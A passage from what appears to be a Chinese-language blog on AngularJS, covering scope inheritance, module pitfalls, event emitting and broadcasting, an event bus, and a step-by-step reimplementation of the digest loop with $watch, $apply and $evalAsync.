ng-bind=&quot;a&quot;&gt;&lt;/span&gt;</span><br><span class="line">            &lt;span ng-bind=&quot;b&quot;&gt;&lt;/span&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">js:</span><br><span class="line">var app = angular.module(&quot;test&quot;, []);</span><br><span class="line"></span><br><span class="line">app.controller(&quot;OuterCtrl&quot;, function ($scope) &#123;</span><br><span class="line">    $scope.a = 1;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.controller(&quot;InnerCtrl&quot;, function ($scope) &#123;</span><br><span class="line">    $scope.b = 100;</span><br><span class="line"></span><br><span class="line">    $scope.increasea = function() &#123;</span><br><span class="line">        $scope.a++;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">//2.数组和对象属性迭代的时候,循环的每个元素都建立了单独的作用域</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li ng-repeat=&quot;member in members&quot;&gt;&#123;&#123;member.name&#125;&#125; in &#123;&#123;teamname&#125;&#125;&lt;/li&gt; //每一个都是子域，但可以共享父域的teamname</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line"></span><br><span class="line">//3.使用ng-if,ng-include,ng-view等指令时构建的DOM，会形成自己的子域</span><br><span class="line"></span><br><span class="line">inner.html</span><br><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;span ng-bind=&quot;name&quot;&gt;&lt;/span&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">outer.html</span><br><span class="line">&lt;div ng-controller=&quot;OuterCtrl&quot;&gt;</span><br><span class="line">    &lt;span ng-bind=&quot;name&quot;&gt;&lt;/span&gt;</span><br><span class="line">    &lt;div ng-include=&quot;&apos;inner.html&apos;&quot;&gt;&lt;/div&gt;//ng-include会创建一层作用域，inner.html里面bind的name会使用OuterCtrl这个父域里面的name</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">function OuterCtrl($scope) &#123;</span><br><span class="line">    $scope.name = &quot;outer name&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>作用域继承的缺点就是，子域绑定值能继承父域同名绑定值的值，但是一旦子域绑定值，因为某种触发函数发生改变，父域同名绑定值不会随之改变<br>虽然可以通过$parent获取父域的同名绑定值，然后子域中做到同时修改，但如果在代码中使用了这种方式，意味着视图模型也只能这样包含，如果再中间插一层子域，<br>则同名关系变成$parent.$parent，使关系进一步复杂<br>所以，应当尽量避免父子作用域存在同名变量的情况</p>
<p>从可重用性角度来看，如果满分5分的话，整个应用的这些部分的得分应当是这样：</p>
<p>服务，比如说，对后端RESTful接口的AJAX调用，对本地存储的访问等，5分<br>控制器（也就是视图模型），2-3分<br>指令，这个要看情况，有的指令是当作对HTML元素体系的扩展来用的，有些是其他事情的<br>纯UI类型的指令，也可以算是控件，比如DatetimePicker，5分<br>有些用于沟通DOM跟视图模型的指令，2分<br>界面模板，这个基本就没有重用性了，1分</p>
<h1 id="模块机制-module的坑"><a href="#模块机制-module的坑" class="headerlink" title="模块机制-module的坑"></a>模块机制-module的坑</h1><p>1.覆盖问题<br>如果moduleA,同时依赖moduleB和moduleC,而moduleB和moduleC有同名的factoryD,那在moduleA使用factoryD的时候，<br>根据依赖顺序，如果moduleB在前，则moduleC的factoryD会覆盖moduleB的factoryD，moduleA使用的是moduleC的factoryD<br>如果在以上依赖情况基础上，moduleA自己又定义了同名factoryD,那么moduleA自己的factoryD会覆盖moduleC的factoryD</p>
<p>2.module不支持运行时添加依赖<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">angular.module(&quot;some.components&quot;, [])</span><br><span class="line">    //这里定义了一些组件</span><br><span class="line">    ;</span><br><span class="line">//上面是一个组件库，集中存放于components.js中，要在自己的应用中使用，必须：</span><br><span class="line">angular.module(&quot;our.app&quot;, [&quot;some.components&quot;]);</span><br><span class="line"></span><br><span class="line">//不可以这样</span><br><span class="line">angular.module(&quot;our.app&quot;, []);</span><br><span class="line"></span><br><span class="line">require(&quot;components.js&quot;, function() &#123;</span><br><span class="line">    // angular.module(&quot;our.app&quot;).addDependency(&quot;some.components&quot;);</span><br><span class="line">    // ready to use</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<h1 id="表达式"><a href="#表达式" class="headerlink" title="表达式"></a>表达式</h1><p>1.在绑定表达式里面，只能使用自定义函数，不能使用原生函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;&#123;&#123;abs(-1)&#125;&#125;&lt;/div&gt;//不允许这样使用</span><br></pre></td></tr></table></figure></p>
<p>如果确实需要调用原生函数，可以用一个自定义函数作包装，在自定义函数里面可以随意使用各种原生对象<br>绑定表达式里可以使用自定义函数，但如果只是对数据做简单处理可以使用过滤器</p>
<p>2.数组里有重复元素的情况，ng-repeat代码不能起作用，原因是Angular默认需要在数组中使用唯一索引<br>可以指定它使用序号作索引<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$scope.arr2 = [1, 1, 3];</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li ng-repeat=&quot;item in arr2 track by $index&quot;&gt;&#123;&#123;item&#125;&#125;&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure></p>
<p>但对象值有重复的话，不用像数组那么麻烦需要指定$index做索引，因为它是对象的key做索引，是不会重复的。</p>
<h1 id="事件流"><a href="#事件流" class="headerlink" title="事件流"></a>事件流</h1><p>angular事件流是一个通知广播的过程<br>现有A、B两个视图，每个视图又包含各自两个子视图，如果A视图的A1子视图想通知B视图的子视图B1一个业务事件(或传递某个消息)<br>那A1就发出业务通知，这个通知会沿着父作用域一路往上到达双方共同的祖先作用域<br>然后这个通知会以广播的形式从祖先作用域一级一级往下进行广播，直到到达需要的地方<br><img src="/image/angularissue.png" alt="issue1"><br>相关事件：<br>从作用域往上发送事件，使用scope.$emit。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$scope.$emit(&quot;someEvent&quot;, &#123;&#125;);</span><br></pre></td></tr></table></figure></p>
<p>从作用域往下发送事件，使用scope.$broadcast<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$scope.$broadcast(&quot;someEvent&quot;, &#123;&#125;);</span><br></pre></td></tr></table></figure></p>
<p>这两个方法的第二个参数是要随事件带出的数据。<br>这两种方式传播事件，事件的发送方自己也会收到一份。<br>无论是$emit还是$broadcast发送的事件，都可以被接收，接收这两种事件的方式是一样的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$scope.$on(&quot;someEvent&quot;, function(e) &#123;</span><br><span class="line">    // 这里从e上可以取到发送过来的数据</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>如果想要阻止$emit事件的继续传播，可以调用事件对象的stopPropagation()方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$scope.$on(&quot;someEvent&quot;, function(e) &#123;</span><br><span class="line">    e.stopPropagation();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>想要阻止$broadcast事件的传播,首先，调用事件对象的preventDefault()方法，<br>然后，在收取这个事件对象的时候，判断它的defaultPrevented属性，如果为true，就忽略此事件。<br>这个过程比较麻烦，其实一般是不需要管的，只要不监听对应的事件就可以了。<br>在实际使用过程中，也应当尽量少使用事件的广播，尤其是从较高的层级进行广播<br>上级作用域<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$scope.$on(&quot;someEvent&quot;, function(e) &#123;</span><br><span class="line">    e.preventDefault();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>下级作用域<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$scope.$on(&quot;someEvent&quot;, function(e) &#123;</span><br><span class="line">    if (e.defaultPrevented) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<h2 id="事件总线"><a href="#事件总线" class="headerlink" title="事件总线"></a>事件总线</h2><p>事件流的通知过程效率低，而且很多下级视图可能根本不要接收消息，进行多余的广播，<br>所以组建订阅发布模式，接收方在这里订阅消息，发布方在这里发布消息，这个地方就是事件总线<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">app.factory(&quot;EventBus&quot;, function() &#123;</span><br><span class="line">    var eventMap = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    var EventBus = &#123;</span><br><span class="line">        on : function(eventType, handler) &#123; //订阅事件</span><br><span class="line">            //multiple event listener</span><br><span class="line">            if (!eventMap[eventType]) &#123;</span><br><span class="line">                eventMap[eventType] = [];</span><br><span class="line">            &#125;</span><br><span class="line">            eventMap[eventType].push(handler);</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        off : function(eventType, handler) &#123;</span><br><span class="line">            for (var i = 0; i &lt; eventMap[eventType].length; i++) &#123;</span><br><span class="line">                if (eventMap[eventType][i] === handler) &#123;</span><br><span class="line">                    eventMap[eventType].splice(i, 1);</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        fire : function(event) &#123; //发布事件</span><br><span class="line">            var eventType = event.type;</span><br><span class="line">            if (eventMap &amp;&amp; eventMap[eventType]) &#123;</span><br><span class="line">                for (var i = 0; i &lt; eventMap[eventType].length; i++) &#123;</span><br><span class="line">                    eventMap[eventType][i](event);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    return EventBus;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/angular/angular-digest.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src>
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/angular/angular-digest.html" itemprop="url">
                  AngularJS Digest
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-10-28T16:33:15+08:00">
                2017-10-28
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h1><p>通常angularjs 环境中变量都绑定在Scope对象上，检测这些变量变化的机制也绑定在该对象上</p>
<p>为了检测数据发生变化，所以为每一个变量创建监听器<br>监听器包含两部分内容<br>一个监控函数,负责前后数据对比<br>一个监听函数，规定对数据变化做出什么响应</p>
<p>但是监听器需要有机制进行触发才能发挥作用<br>即调用监控函数，看数据是否发生变化，然后根据结果再调用监听函数，对变化做出响应</p>
<p>因此，在Scope对象上挂载函数和属性实现以上机制</p>
<p>Scope.$$watchers = []    用于保存注册过的所有监听器</p>
<p>Scope.prototype.$watch = function(watchFn, listenerFn) {} 用于将监控函数和监听函数组合成监听器，然后保存到$$watchers<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Scope.prototype.$watch = function(watchFn, listenerFn) &#123;</span><br><span class="line">  var watcher = &#123;</span><br><span class="line">    watchFn: watchFn,//监控函数</span><br><span class="line">    listenerFn: listenerFn || function() &#123; &#125; //监听函数</span><br><span class="line">  &#125;;</span><br><span class="line">  this.$$watchers.push(watcher);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>Scope.prototype.$$digestOnce = function() {}<br>具体的脏检查过程，初始化变更标记，遍历一遍$$watchers，<br>如果某个数据发生变化就执行对应监听函数，<br>并将变更标记设置true返回<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Scope.prototype.$$digestOnce = function() &#123;</span><br><span class="line">  var self  = this;</span><br><span class="line">  var dirty;</span><br><span class="line">  _.forEach(this.$$watchers, function(watch) &#123;</span><br><span class="line">    var newValue = watch.watchFn(self);</span><br><span class="line">    var oldValue = watch.last;</span><br><span class="line">    if (newValue !== oldValue) &#123;</span><br><span class="line">      watch.listenerFn(newValue, oldValue, self);</span><br><span class="line">      dirty = true;</span><br><span class="line">    &#125;</span><br><span class="line">    watch.last = newValue;</span><br><span class="line">  &#125;);</span><br><span class="line">  return dirty;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>Scope.prototype.$digest = function() {} 循环执行检测，保证监控器内部对属性进行的变更也能被检测到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Scope.prototype.$digest = function() &#123;</span><br><span class="line">  var ttl = 10;</span><br><span class="line">  var dirty;</span><br><span class="line">  do &#123;</span><br><span class="line">    dirty = this.$$digestOnce();</span><br><span class="line">    if (dirty &amp;&amp; !(ttl--)) &#123;</span><br><span class="line">      throw &quot;10 digest iterations reached&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; while (dirty);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>如果仅执行一次digest，检测不到B监听器监听函数修改的A监听器监听的属性新值，<br>因此进行持续遍历所有监听器，直到监控的值停止变更<br>$digest为$$digestOnce包裹一个do-while“外层循环”，<br>如果第一次运行完，有监控值发生变更了，标记为dirty，所有监听器再运行第二次。这会一直运行，直到所有监控的值都不再变化，整个局面稳定下来了。<br>如果两个监听器互相监控了对方产生的变更，状态始终不会稳定，因此添加迭代数量ttl，限制迭代次数，保证循环检测的可控性，达到ttl就抛异常</p>
<h1 id="对于新旧值的判断-areEqual"><a href="#对于新旧值的判断-areEqual" class="headerlink" title="对于新旧值的判断 - $$areEqual"></a>对于新旧值的判断 - $$areEqual</h1><p>$$digestOnce中使用！==判断新旧值，可以判断值的引用但无法判断值的变更<br>因此在监控器里增加字段valueEq，用来定制判断方法，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Scope.prototype.$watch = function(watchFn, listenerFn, valueEq) &#123;</span><br><span class="line">  var watcher = &#123;</span><br><span class="line">    watchFn: watchFn,</span><br><span class="line">    listenerFn: listenerFn,</span><br><span class="line">    valueEq: !!valueEq</span><br><span class="line">  &#125;;</span><br><span class="line">  this.$$watchers.push(watcher);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>定制判断方法,抽离成函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Scope.prototype.$$areEqual = function(newValue, oldValue, valueEq) &#123;</span><br><span class="line">  if (valueEq) &#123;</span><br><span class="line">    return _.isEqual(newValue, oldValue);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    return newValue === oldValue ||</span><br><span class="line">      (typeof newValue === &apos;number&apos; &amp;&amp; typeof oldValue === &apos;number&apos; &amp;&amp;</span><br><span class="line">       isNaN(newValue) &amp;&amp; isNaN(oldValue));//对NaN特殊情况进行处理</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>判断方法发生改变，进而存储方法也要根据判断方式进行改变<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Scope.prototype.$$digestOnce = function() &#123;</span><br><span class="line">  var self  = this;</span><br><span class="line">  var dirty;</span><br><span class="line">  _.forEach(this.$$watchers, function(watch) &#123;</span><br><span class="line">    var newValue = watch.watchFn(self);</span><br><span class="line">    var oldValue = watch.last;</span><br><span class="line">    if (!self.$$areEqual(newValue, oldValue, watch.valueEq)) &#123;</span><br><span class="line">      watch.listenerFn(newValue, oldValue, self);</span><br><span class="line">      dirty = true;</span><br><span class="line">    &#125;</span><br><span class="line">    watch.last = (watch.valueEq ? _.cloneDeep(newValue) : newValue); //定制存储方式</span><br><span class="line">  &#125;);</span><br><span class="line">  return dirty;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>Angular默认不使用基于值的脏检测的原因，用户需要显式设置这个标记去打开它。</p>
<h1 id="集成外部代码与digest循环-apply"><a href="#集成外部代码与digest循环-apply" class="headerlink" title="集成外部代码与digest循环-$apply"></a>集成外部代码与digest循环-$apply</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//$eval使用一个函数作参数，所做的事情是立即执行这个传入的函数，并且把作用域自身当作参数传递给它，</span><br><span class="line">//返回的是这个函数的返回值。$eval也可以有第二个参数，它所做的仅仅是把这个参数传递给这个函数。</span><br><span class="line">Scope.prototype.$eval = function(expr, locals) &#123;</span><br><span class="line">  return expr(this, locals);</span><br><span class="line">&#125;;</span><br><span class="line">//$apply可以执行一些与Angular无关的代码(expr)，这些代码也还是可以改变作用域上的东西，</span><br><span class="line">//$apply可以保证作用域上的监听器可以检测这些变更。</span><br><span class="line">Scope.prototype.$apply = function(expr) &#123;</span><br><span class="line">  try &#123;</span><br><span class="line">    return this.$eval(expr);</span><br><span class="line">  &#125; finally &#123;</span><br><span class="line">    this.$digest();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1 id="延迟执行-evalAsync"><a href="#延迟执行-evalAsync" class="headerlink" title="延迟执行 - $evalAsync"></a>延迟执行 - $evalAsync</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">Scope.$$asyncQueue = [];//存储$evalAsync列入计划的任务</span><br><span class="line">Scope.$$phase = null;//作用域上一个简单的字符串属性，存储了现在正在做的信息</span><br><span class="line">//设置$$phase</span><br><span class="line">Scope.prototype.$beginPhase = function(phase) &#123;</span><br><span class="line">  if (this.$$phase) &#123;</span><br><span class="line">    throw this.$$phase + &apos; already in progress.&apos;;</span><br><span class="line">  &#125;</span><br><span class="line">  this.$$phase = phase;</span><br><span class="line">&#125;;</span><br><span class="line">//删除$$phase</span><br><span class="line">Scope.prototype.$clearPhase = function() &#123;</span><br><span class="line">  this.$$phase = null;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Scope.prototype.$digest = function() &#123;</span><br><span class="line">  var ttl = 10;</span><br><span class="line">  var dirty;</span><br><span class="line">  this.$beginPhase(&quot;$digest&quot;); //设置状态</span><br><span class="line">  do &#123;</span><br><span class="line">    while (this.$$asyncQueue.length) &#123;</span><br><span class="line">      var asyncTask = this.$$asyncQueue.shift();</span><br><span class="line">      this.$eval(asyncTask.expression);</span><br><span class="line">    &#125;</span><br><span class="line">    dirty = this.$$digestOnce();</span><br><span class="line">    if (dirty &amp;&amp; !(ttl--)) &#123;</span><br><span class="line">      this.$clearPhase();</span><br><span class="line">      throw &quot;10 digest iterations reached&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; while (dirty);</span><br><span class="line">  this.$clearPhase();//移除状态</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Scope.prototype.$apply = function(expr) &#123;</span><br><span class="line">  try &#123;</span><br><span class="line">    this.$beginPhase(&quot;$apply&quot;);//设置状态</span><br><span class="line">    return this.$eval(expr);</span><br><span class="line">  &#125; finally &#123;</span><br><span class="line">    this.$clearPhase();//移除状态</span><br><span class="line">    this.$digest();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Scope.prototype.$evalAsync = function(expr) &#123; 添加任务</span><br><span class="line">  Scope.prototype.$evalAsync = function(expr) &#123;</span><br><span class="line">  var self = this;</span><br><span class="line">  if (!self.$$phase &amp;&amp; !self.$$asyncQueue.length) &#123;</span><br><span class="line">    console.log(1)</span><br><span class="line">    setTimeout(function() &#123;利用异步，连续添加任务后一定会立即digest一次</span><br><span class="line">      console.log(3)</span><br><span class="line">      if (self.$$asyncQueue.length) &#123;</span><br><span class="line">        self.$digest();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, 0);</span><br><span class="line">  &#125;</span><br><span class="line">  console.log(2)</span><br><span class="line">  self.$$asyncQueue.push(&#123;scope: self, expression: expr&#125;);</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">&#125;;</span><br><span class="line">Scope.prototype.$digest = function() &#123;</span><br><span class="line">  var ttl = 10;</span><br><span class="line">  var dirty;</span><br><span class="line">  do &#123;</span><br><span class="line">    while (this.$$asyncQueue.length) &#123; </span><br><span class="line">      var asyncTask = this.$$asyncQueue.shift();</span><br><span class="line">      this.$eval(asyncTask.expression);</span><br><span class="line">    &#125;</span><br><span class="line">    dirty = this.$$digestOnce();</span><br><span class="line">    if (dirty &amp;&amp; !(ttl--)) &#123;</span><br><span class="line">      throw &quot;10 digest iterations reached&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; while (dirty);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在监听函数中执行$evalAsync，digest第一次时延迟任务不会被执行，当dirty时，才会被执行<br>例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var scope = new Scope();</span><br><span class="line">scope.asyncEvaled = false;</span><br><span class="line"></span><br><span class="line">scope.$evalAsync(function(scope) &#123;</span><br><span class="line">  scope.asyncEvaled = false;</span><br><span class="line">&#125;);</span><br><span class="line">console.log(4)</span><br><span class="line">scope.$evalAsync(function(scope) &#123;</span><br><span class="line">  scope.asyncEvaled = true;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">console.log(&quot;Evaled after digest: &quot;+scope.asyncEvaled);//true</span><br></pre></td></tr></table></figure></p>
<h1 id="在digest之后执行代码-postDigest"><a href="#在digest之后执行代码-postDigest" class="headerlink" title="在digest之后执行代码 - $$postDigest"></a>在digest之后执行代码 - $$postDigest</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">this.$$postDigestQueue = [];//$$postDigest函数列入计划</span><br><span class="line">Scope.prototype.$$postDigest = function(fn) &#123;</span><br><span class="line">  this.$$postDigestQueue.push(fn);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Scope.prototype.$digest = function() &#123;</span><br><span class="line">  var ttl = 10;</span><br><span class="line">  var dirty;</span><br><span class="line">  this.$beginPhase(&quot;$digest&quot;);</span><br><span class="line">  do &#123;</span><br><span class="line">    while (this.$$asyncQueue.length) &#123;</span><br><span class="line">      try &#123;//执行函数时，使用try-catch进行异常处理</span><br><span class="line">        var asyncTask = this.$$asyncQueue.shift();</span><br><span class="line">        this.$eval(asyncTask.expression);</span><br><span class="line">      &#125; catch (e) &#123;</span><br><span class="line">        (console.error || console.log)(e);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    dirty = this.$$digestOnce();</span><br><span class="line">    if (dirty &amp;&amp; !(ttl--)) &#123;</span><br><span class="line">      